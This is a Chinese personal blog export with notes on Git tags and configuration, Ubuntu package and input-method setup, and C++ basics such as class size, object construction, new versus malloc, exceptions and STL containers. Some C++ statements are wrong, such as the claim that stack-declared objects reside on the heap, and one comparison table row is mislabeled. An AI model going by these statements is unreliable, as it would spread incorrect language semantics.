使用的标签有两种类型：轻量级的（lightweight）和含附注的（annotated）。</p><p>轻量级标签就像是个不会变化的分支，实际上它就是个指向特定提交对象的引用。而含附注标签，实际上是存储在仓库中的一个独立对象，它有自身的校验和信息，包含着标签的名字，电子邮件地址和日期，以及标签说明，标签本身也允许使用 GNU Privacy Guard (GPG) 来签署或验证。一般我们都建议使用含附注型的标签，以便保留相关信息；当然，如果只是临时性加注标签，或者不需要旁注额外信息，用轻量级标签也没问题。</p><h3 id="含附注的标签"><a href="#含附注的标签" class="headerlink" title="含附注的标签"></a>含附注的标签</h3><p>创建一个含附注类型的标签非常简单，用 -a （译注：取 annotated 的首字母）指定标签名字即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -a (version) -m 'comment'</span><br></pre></td></tr></table></figure><p>而 -m 选项则指定了对应的标签说明，Git 会将此说明一同保存在标签对象中。如果没有给出该选项，Git 会启动文本编辑软件供你输入标签说明。</p><h3 id="签署标签"><a href="#签署标签" class="headerlink" title="签署标签"></a>签署标签</h3><p>如果你有自己的私钥，还可以用 GPG 来签署标签，只需要把之前的 -a 改为 -s （译注： 取 signed 的首字母）即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -s (version) -m 'comment'</span><br></pre></td></tr></table></figure><h3 id="轻量级标签"><a href="#轻量级标签" class="headerlink" title="轻量级标签"></a>轻量级标签</h3><p>轻量级标签实际上就是一个保存着对应提交对象的校验和信息的文件。要创建这样的标签，一个 -a，-s 或 -m 选项都不用，直接给出标签名字即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag (version)</span><br></pre></td></tr></table></figure><h2 id="验证标签"><a href="#验证标签" class="headerlink" title="验证标签"></a>验证标签</h2><p>可以使用 git tag -v [tag-name] （译注：取 verify 的首字母）的方式验证已经签署的标签。此命令会调用 GPG 来验证签名，所以你需要有签署者的公钥，存放在 keyring 中，才能验证：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -v (version)</span><br></pre></td></tr></table></figure><p>若是没有签署者的公钥，会报告类似下面这样的错误：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg: Signature made Wed Sep 13 02:08:25 2006 PDT using DSA key ID F3119B9A</span><br><span class="line">gpg: Can't check signature: public key not found</span><br><span class="line">error: could not verify the tag 'v1.4.2.1'</span><br></pre></td></tr></table></figure><h2 id="后期加注标签"><a href="#后期加注标签" class="headerlink" title="后期加注标签"></a>后期加注标签</h2><p>你甚至可以在后期对早先的某次提交加注标签。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag -a (version) (commitNumber)</span><br></pre></td></tr></table></figure><h2 id="分享标签"><a href="#分享标签" class="headerlink" title="分享标签"></a>分享标签</h2><p>默认情况下，git push 并不会把标签传送到远端服务器上，只有通过显式命令才能分享标签到远端仓库。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push (origin_name) (tag)</span><br></pre></td></tr></table></figure><h2 id="推送所有本地新增的标签上去"><a href="#推送所有本地新增的标签上去" class="headerlink" title="推送所有本地新增的标签上去"></a>推送所有本地新增的标签上去</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push (origin_name) --tags</span><br></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><h3 id="修改远程仓库地址"><a href="#修改远程仓库地址" class="headerlink" title="修改远程仓库地址"></a>修改远程仓库地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote set-url (origin_name) (url)</span><br></pre></td></tr></table></figure><h3 id="删除现有远程仓库"><a href="#删除现有远程仓库" class="headerlink" title="删除现有远程仓库"></a>删除现有远程仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote rm (origin_name)</span><br></pre></td></tr></table></figure><h3 id="添加新的远程仓库"><a href="#添加新的远程仓库" class="headerlink" title="添加新的远程仓库"></a>添加新的远程仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add (origin_name) (url)</span><br></pre></td></tr></table></figure><h3 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><h2 id="记住密码"><a href="#记住密码" class="headerlink" title="记住密码"></a>记住密码</h2><h3 id="设置记住密码（默认15分钟）："><a href="#设置记住密码（默认15分钟）：" class="headerlink" title="设置记住密码（默认15分钟）："></a>设置记住密码（默认15分钟）：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper cache</span><br></pre></td></tr></table></figure><h3 id="如果想自己设置时间，可以这样做："><a href="#如果想自己设置时间，可以这样做：" class="headerlink" title="如果想自己设置时间，可以这样做："></a>如果想自己设置时间，可以这样做：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config credential.helper 'cache --timeout=3600'</span><br></pre></td></tr></table></figure><p>这样就设置一个小时之后失效</p><h3 id="长期存储密码："><a href="#长期存储密码：" class="headerlink" title="长期存储密码："></a>长期存储密码：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure><h2 id="格式配置"><a href="#格式配置" class="headerlink" title="格式配置"></a>格式配置</h2><h3 id="不自动改换行符LF-CRLF"><a href="#不自动改换行符LF-CRLF" class="headerlink" title="不自动改换行符LF/CRLF"></a>不自动改换行符LF/CRLF</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global core.autocrlf false</span><br></pre></td></tr></table></figure><h3 id="允许长路径"><a href="#允许长路径" class="headerlink" title="允许长路径"></a>允许长路径</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --system core.longpaths true</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu学习</title>
    <url>/2018/07/27/2018-07-27-ubuntuStudy/</url>
    <content><![CDATA[<h1 id="解决依赖关系"><a href="#解决依赖关系" class="headerlink" title="解决依赖关系"></a>解决依赖关系</h1><h2 id="不指名解决依赖关系"><a href="#不指名解决依赖关系" class="headerlink" title="不指名解决依赖关系"></a>不指名解决依赖关系</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt --fix-broken install</span><br></pre></td></tr></table></figure><h1 id="忽略某个包的更新"><a href="#忽略某个包的更新" class="headerlink" title="忽略某个包的更新"></a>忽略某个包的更新</h1><p>使用以下命令可以忽略某个包的更新</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-mark hold (pack)</span><br></pre></td></tr></table></figure><p>取消忽略</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-mark unhold (pack)</span><br></pre></td></tr></table></figure><h1 id="添加编码"><a href="#添加编码" class="headerlink" title="添加编码"></a>添加编码</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales   # 跟着步骤配一下自己需要的编码</span><br></pre></td></tr></table></figure><h1 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h1><h2 id="1-安装fcitx"><a href="#1-安装fcitx" class="headerlink" title="1. 安装fcitx"></a>1. 安装fcitx</h2><p>执行以下命令相关依赖包都会安装上去</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx-bin</span><br></pre></td></tr></table></figure><p>安装输入法</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx-table</span><br></pre></td></tr></table></figure><h2 id="2-配置fcitx"><a href="#2-配置fcitx" class="headerlink" title="2. 配置fcitx"></a>2. 配置fcitx</h2><p>选择设置中的<code>Region &amp; Language</code>一栏中的<code>Manage Installed Language</code></p><img src="/2018/07/27/2018-07-27-ubuntuStudy/2018_11_30_01.png"><p>选择<code>Keyboard input method system:</code>为<code>fcitx</code></p><img src="/2018/07/27/2018-07-27-ubuntuStudy/2018_11_30_02.png"><p><strong>重启ubuntu</strong></p><h2 id="3-配置输入法"><a href="#3-配置输入法" class="headerlink" title="3. 配置输入法"></a>3. 配置输入法</h2><p>重启后看到右上角有个小键盘，点击进入<code>Configure</code></p><img src="/2018/07/27/2018-07-27-ubuntuStudy/2018_11_30_03.png"><p>点击<code>+</code>添加输入法</p><img src="/2018/07/27/2018-07-27-ubuntuStudy/2018_11_30_04.png"><p>添加其中的<code>pinyin</code>，即可使用中文输入</p><img src="/2018/07/27/2018-07-27-ubuntuStudy/2018_11_30_05.png"><p><strong><code>Ctrl + Space</code>切换输入法</strong></p><h2 id="4-安装搜狗输入法"><a href="#4-安装搜狗输入法" class="headerlink" title="4. 安装搜狗输入法"></a>4. 安装搜狗输入法</h2><p>到<a href="https://pinyin.sogou.com/linux/?r=pinyin" target="_blank" rel="noopener">官网</a>下载搜狗输入法，安装后重启，在配置界面调整位置即可，第一次启动或许会有一些问题，重启即可</p>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>C++学习笔记</title>
    <url>/2018/07/06/2018-07-06-CppSutdy/</url>
    <content><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="类的大小"><a href="#类的大小" class="headerlink" title="类的大小"></a>类的大小</h3><h4 id="空类"><a href="#空类" class="headerlink" title="空类"></a>空类</h4><p>C++标准指出，不允许一个对象（当然包括类对象）的大小为0，不同的对象不能具有相同的地址。这是由于：</p><ul><li>new需要分配不同的内存地址，不能分配内存大小为0的空间</li><li>避免除以sizeof(T)时得到除以0错误</li></ul><p>故使用1个字节来区分空类。结构体与此相同，空结构体大小为1个字节</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span><span class="keyword">int</span> a&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sizeof empty class %d"</span>, <span class="keyword">sizeof</span>(A));     <span class="comment">//输出1，空类大小为1个字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sizeof not empty class %d"</span>, <span class="keyword">sizeof</span>(B)); <span class="comment">//输出4，int为4个字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字节对齐"><a href="#字节对齐" class="headerlink" title="字节对齐"></a>字节对齐</h4><p>类中变量大小需要字节对齐，计算大小时需注意</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sizeof class A %d"</span>, <span class="keyword">sizeof</span>(A));     <span class="comment">//输出8，字节对齐4+4=8字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h4><p>静态成员属于类作用域，但不属于类对象，它的生命周期和普通的静态变量一样，程序运行时进行分配内存和初始化，程序结束时则被释放。所以不能在类的构造函数中进行初始化。</p><h5 id="static成员的优点"><a href="#static成员的优点" class="headerlink" title="static成员的优点"></a>static成员的优点</h5><ul><li>static成员的名字是在类的作用域中，因此可以避免与其它类成员或全局对象名字冲突。</li><li>可以实施封装，static成员可以是私有的，而全局对象不可以。</li><li>阅读程序容易看出static成员与某个类相关联，这种可见性可以清晰地反映程序员的意图。</li></ul><h5 id="static成员函数特点"><a href="#static成员函数特点" class="headerlink" title="static成员函数特点"></a>static成员函数特点</h5><ul><li>因为static成员函数没有this指针，所以静态成员函数不可以访问非静态成员。</li><li>非静态成员函数可以访问静态成员。</li><li>静态数据成员与类的大小无关，因为静态成员只是作用在类的范围而已。</li></ul><h5 id="大小"><a href="#大小" class="headerlink" title="大小"></a>大小</h5><p>静态变量不占用类的大小中，所以sizeof输出的大小不包含静态变量的大小</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> b;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//输出8，字节对齐4+4=8字节，静态变量不参与运算</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sizeof class A %d"</span>, <span class="keyword">sizeof</span>(A));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h4><p>成员函数不算在类的大小中</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> b;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fun2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//输出8，字节对齐4+4=8字节，成员函数不参与大小计算</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sizeof class A %d"</span>, <span class="keyword">sizeof</span>(A));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h3><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><ul><li>如果不写构造函数，系统会默认初始化一个默认构造函数</li><li>当写了带参数的构造函数，系统将不会创建默认构造函数，默认构造函数不可用，除非自己定义</li></ul><h4 id="使用和不适用new"><a href="#使用和不适用new" class="headerlink" title="使用和不适用new"></a>使用和不适用new</h4><ol><li>用类名创建对象，相当于局部变量，变量在栈上，系统自动销毁。</li><li>使用new创建对象，在堆上申请内存，返回指针，需要delete进行销毁。</li></ol><h4 id="加不加括号的区别"><a href="#加不加括号的区别" class="headerlink" title="加不加括号的区别"></a>加不加括号的区别</h4><ul><li>类名 对象名<ul><li>默认调用“对象名()”这个构造函数，在栈内存中存在对象名，在堆内存中存在实际对象；</li></ul></li><li>类名 对象名()<ul><li>相当于定义了一个返回值为类的函数，没有任何意义；</li></ul></li><li>类名 对象名(一个或以上个参数)<ul><li>默认调用相应的构造函数，在栈内存中存在对象名，在堆内存中也是存在实际对象的；</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    A() = <span class="keyword">default</span>;</span><br><span class="line">    A(<span class="keyword">int</span> n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a1;       <span class="comment">//调用A()实例化对象</span></span><br><span class="line">    <span class="function">A <span class="title">a2</span><span class="params">()</span></span>;     <span class="comment">//定义返回值为A的函数，没有意义</span></span><br><span class="line">    <span class="function">A <span class="title">a3</span><span class="params">(<span class="number">5</span>)</span></span>;    <span class="comment">//调用A(int n)实例化对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参数是否初始化"><a href="#参数是否初始化" class="headerlink" title="参数是否初始化"></a>参数是否初始化</h4><h5 id="使用new"><a href="#使用new" class="headerlink" title="使用new"></a>使用new</h5><ul><li>new一个对象不加括号，如果有默认构造函数则会初始化；没有默认构造函数相当于只分配了内存，灭有初始化</li><li>new一个对象加括号，有默认构造函数或者没有构造函数会初始化，但是写空的构造函数不会初始化</li><li>带参数的构造函数会先调用不带参数的默认构造函数，参数是否初始化同上</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> m_a;</span><br><span class="line">    A() = <span class="keyword">default</span>;</span><br><span class="line">    A(<span class="keyword">int</span> n)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> m_b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> m_c;</span><br><span class="line">    C() &#123;&#125;</span><br><span class="line">    C(<span class="keyword">int</span> n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span>* arg[])</span> </span>&#123;</span><br><span class="line">    A *pA1 = <span class="keyword">new</span> A;</span><br><span class="line">    A *pA2 = <span class="keyword">new</span> A();</span><br><span class="line">    A *pA3 = <span class="keyword">new</span> A(<span class="number">5</span>);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'A *pA1 = new A;' is at 0x%p, a %d"</span>, pA1, pA1-&gt;m_a);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'A *pA2 = new A();' is at 0x%p, a %d"</span>, pA2, pA2-&gt;m_a);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'A *pA3 = new A(5);' is at 0x%p, a %d"</span>, pA3, pA3-&gt;m_a);</span><br><span class="line"></span><br><span class="line">    B *pB1 = <span class="keyword">new</span> B;</span><br><span class="line">    B *pB2 = <span class="keyword">new</span> B();</span><br><span class="line">    LOG_DEBUG(<span class="string">"'B *pB1 = new B;' is at 0x%p, b %d"</span>, pB1, pB1-&gt;m_b);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'B *pB2 = new B();' is at 0x%p, b %d"</span>, pB2, pB2-&gt;m_b);</span><br><span class="line"></span><br><span class="line">    C *pC1 = <span class="keyword">new</span> C;</span><br><span class="line">    C *pC2 = <span class="keyword">new</span> C();</span><br><span class="line">    C *pC3 = <span class="keyword">new</span> C(<span class="number">5</span>);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'C *pC1 = new C;' is at 0x%p, c %d"</span>, pC1, pC1-&gt;m_c);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'C *pC2 = new C();' is at 0x%p, c %d"</span>, pC2, pC2-&gt;m_c);</span><br><span class="line">    LOG_DEBUG(<span class="string">"'C *pC3 = new C(5);' is at 0x%p, c %d"</span>, pC3, pC3-&gt;m_c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> pA1;</span><br><span class="line">    <span class="keyword">delete</span> pA2;</span><br><span class="line">    <span class="keyword">delete</span> pA3;</span><br><span class="line">    <span class="keyword">delete</span> pB1;</span><br><span class="line">    <span class="keyword">delete</span> pB2;</span><br><span class="line">    <span class="keyword">delete</span> pC1;</span><br><span class="line">    <span class="keyword">delete</span> pC2;</span><br><span class="line">    <span class="keyword">delete</span> pC3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'A *pA1 = new A;'</span> is at 0x0x55575e582e70, a 0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'A *pA2 = new A();'</span> is at 0x0x55575e582e90, a 0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'A *pA3 = new A(5);'</span> is at 0x0x55575e582eb0, a 0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'B *pB1 = new B;'</span> is at 0x0x55575e583590, b 1413816944</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'B *pB2 = new B();'</span> is at 0x0x55575e5835b0, b 0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'C *pC1 = new C;'</span> is at 0x0x55575e5835d0, c 1413815456</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'C *pC2 = new C();'</span> is at 0x0x55575e5835f0, c 1413815456</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'C *pC3 = new C(5);'</span> is at 0x0x55575e583610, c 1413815456</span></span><br></pre></td></tr></table></figure><h3 id="new和malloc的区别"><a href="#new和malloc的区别" class="headerlink" title="new和malloc的区别"></a>new和malloc的区别</h3><table><thead><tr><th>特征</th><th>new/delete</th><th>malloc/free</th></tr></thead><tbody><tr><td>分配内存的位置</td><td>自由存储区</td><td>堆</td></tr><tr><td>内存分配失败返回值</td><td>完整类型指针</td><td>void*</td></tr><tr><td>内存分配失败返回值</td><td>默认抛出异常</td><td>返回NULL</td></tr><tr><td>分配内存的大小</td><td>由编译器根据类型计算得出</td><td>必须显式指定字节数</td></tr><tr><td>处理数组</td><td>有处理数组的new版本new[]</td><td>需要用户计算数组的大小后进行内存分配</td></tr><tr><td>已分配内存的扩充</td><td>无法直观地处理</td><td>使用realloc简单完成</td></tr><tr><td>是否相互调用</td><td>可以，看具体的operator new/delete实现</td><td>不可调用new</td></tr><tr><td>分配内存时内存不足</td><td>客户能够指定处理函数或重新制定分配器</td><td>无法通过用户代码进行处理</td></tr><tr><td>函数重载</td><td>允许</td><td>不允许</td></tr><tr><td>构造函数与析构函数</td><td>调用</td><td>不调用</td></tr></tbody></table><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><h3 id="指针和引用的区别"><a href="#指针和引用的区别" class="headerlink" title="指针和引用的区别"></a>指针和引用的区别</h3><table><thead><tr><th>指针 <code>*</code></th><th>引用 <code>&amp;</code></th></tr></thead><tbody><tr><td>可以指向空地址</td><td>不可为空</td></tr><tr><td>变量，储存地址，初始化后可变</td><td>就是所引用的变量，初始化后不可变</td></tr><tr><td>可以有多级，如<code>**p</code></td><td>只有一级</td></tr><tr><td>sizeof为指针变量的大小</td><td>sizeof为对象大小</td></tr></tbody></table><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="抛出异常和捕获异常"><a href="#抛出异常和捕获异常" class="headerlink" title="抛出异常和捕获异常"></a>抛出异常和捕获异常</h3><ul><li>抛出异常可以使用任意类型，包括内置类型，也可以抛出一个异常类</li><li>使用<code>...</code>可以捕获所有异常</li><li>使用<code>throw</code>语句，类的析构函数会被调用</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抛出异常</span></span><br><span class="line"><span class="keyword">throw</span> MyError(<span class="string">"Something bad happened"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//捕获异常</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//会造成异常的程序</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(type1 id1) &#123;</span><br><span class="line">    <span class="comment">//处理type1类型的异常</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(type2 id2) &#123;</span><br><span class="line">    <span class="comment">//处理type2类型的异常</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(...) &#123;</span><br><span class="line">    <span class="comment">//处理所有类型的异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重新抛出异常"><a href="#重新抛出异常" class="headerlink" title="重新抛出异常"></a>重新抛出异常</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">catch</span> (...) &#123;</span><br><span class="line">    <span class="comment">//做一些处理工作，然后将异常重新抛出到上一级</span></span><br><span class="line">    <span class="keyword">throw</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>如果异常抛出一个类，将抛出一个类的拷贝，所以此类必须可拷贝</li><li>如果异常抛出一个派生类，捕获使用基类可以捕获基类和所有派生类的异常，通常将派生类的捕获放在前面，基类的捕获放在最后用于捕获其他不常用的所有派生类的异常</li></ul><h3 id="terminator"><a href="#terminator" class="headerlink" title="terminator()"></a>terminator()</h3><ul><li>当没有一个异常处理器捕获某种异常的时候，<code>terminator()</code>会被调用</li><li>当析构函数中抛出异常时，<code>terminator()</code>会被调用</li></ul><h4 id="set-terminator"><a href="#set-terminator" class="headerlink" title="set_terminator()"></a>set_terminator()</h4><ul><li>用户可以自定义<code>void terminator()</code>函数</li><li>首次调用会返回默认的函数指针</li></ul><p>示例</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;exception&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">terminator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"I'll be back!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*old_terminate)() = set_terminate(terminator);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Botch</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Fruit</span> &#123;</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Botch::f()"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">throw</span> Fruit();</span><br><span class="line">    &#125;</span><br><span class="line">    ~Botch() &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"~Botch()"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">'c'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Botch b;</span><br><span class="line">        b.f();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Inside catch(...)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Botch::f()</span><br><span class="line">~Botch()</span><br><span class="line">I'll be back!</span><br></pre></td></tr></table></figure><h2 id="显示转换"><a href="#显示转换" class="headerlink" title="显示转换"></a>显示转换</h2><h3 id="std-static-cast"><a href="#std-static-cast" class="headerlink" title="std::static_cast"></a>std::static_cast</h3><h3 id="std-static-pointer-cast"><a href="#std-static-pointer-cast" class="headerlink" title="std::static_pointer_cast"></a>std::static_pointer_cast</h3><h3 id="std-const-cast"><a href="#std-const-cast" class="headerlink" title="std::const_cast"></a>std::const_cast</h3><h2 id="STL容器"><a href="#STL容器" class="headerlink" title="STL容器"></a>STL容器</h2><ol><li><p>vector （连续的空间存储,可以使用[]操作符）快速的访问随机的元素，快速的在末尾插入元素，但是在序列中间岁间的插入，删除元素要慢，而且如果一开始分配的空间不够的话，有一个重新分配更大空间，然后拷贝的性能开销.</p></li><li><p>deque （小片的连续，小片间用链表相连，实际上内部有一个map的指针，因为知道类型，所以还是可以使用[]，只是速度没有vector快）快速的访问随机的元素，快速的在开始和末尾插入元素，随机的插入，删除元素要慢，空间的重新分配要比vector快,重新分配空间后，原有的元素不需要拷贝。对deque的排序操作，可将deque先复制到vector，排序后在复制回deque。</p></li><li><p>list （每个元素间用链表相连）访问随机元素不如vector快，随机的插入元素比vector快，对每个元素分配空间，所以不存在空间不够，重新分配的情况</p></li><li><p>set 内部元素唯一，用一棵平衡树结构来存储，因此遍历的时候就排序了，查找也比较快的哦。</p></li><li><p>map 一对一的映射的结合，key不能重复。</p></li><li><p>stack 